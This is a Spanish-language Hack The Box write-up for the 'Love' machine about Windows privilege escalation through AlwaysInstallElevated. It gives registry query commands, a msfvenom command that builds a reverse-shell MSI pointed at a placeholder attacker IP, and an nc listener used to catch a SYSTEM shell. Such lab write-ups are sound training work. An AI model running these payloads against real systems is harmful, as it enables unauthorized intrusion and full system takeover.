---
title: "Love HTB Escalando Privilegio"
layout: post
---
![Love HTB](/assets/images/love.png)

<h2>Presentación</h2>
En esta ocasión estaré presentando otra escalada de privilegio en windows y es abusando de: AlwaysInstallElevated, me había tomado tiempo la preparación de algunos writeUp, ya que estuve preparandome para el eJPT el cual logramos obtener, tesis, mudanza y otras movidas como seguir con networking y firewall desde EVE-NG, pronto..  🤯.

<h2>WinPEAS</h2>
En la fase de búsqueda de privilegias, WinPeas nos presenta el siguiente setting:

![Love HTB Escalando Privilegio ](/assets/images/love-1.png)

Este key registry significa que cualquier usuario puede instalar un archivo .msi con privilegios de NT Authority\System.

<h2>Enumeración Manual</h2>

Puedes hacer la solicitud al registro de manera manual con los siguientes comandos:

{% highlight bash %}
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
{% endhighlight %}

el regultado de ambos query debe devolver el valor 1, es decir (value is 0x1), de lo contrario sera imposible explotar dicha vulnerabilidad. 

<h2> ¿Qué hago ahora? </h2>
 
 Podemos generar un archivo malicoiso .msi con msfvenom.
 
 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
 ```
 
 ![Love HTB Escalando Privilegio ](/assets/images/love-2.png)

Podemos ponernos en escucha por el puerto especificado en el payload, o hacer uso del exploit/multi/handler.

```rlwrap nc -nlvp 443
 ```
Transferimos el archivo setup.msi a la máquina víctima, en esta ocasión haciendo uso de certutil.exe, como podemos ver a continuación. 

 ![Love HTB Escalando Privilegio ](/assets/images/love-3.png)
 
En nuestro caso lo depositamos en la siguiente ruta.
{% highlight bash %}
C:\Windows\Temp\priv\setup.msi
{% endhighlight %}

<h2>PoC</h2>

Ejecutamos el siguiente comando a la vez que nos mantenemos en escucha en nuestra máquina.

![Love HTB Escalando Privilegio ](/assets/images/love-4.png)

al instante recibimos nuestra conexión. 
![Love HTB Escalando Privilegio ](/assets/images/love-5.png)

🖱️_by:_ *@DaVinciRoot*
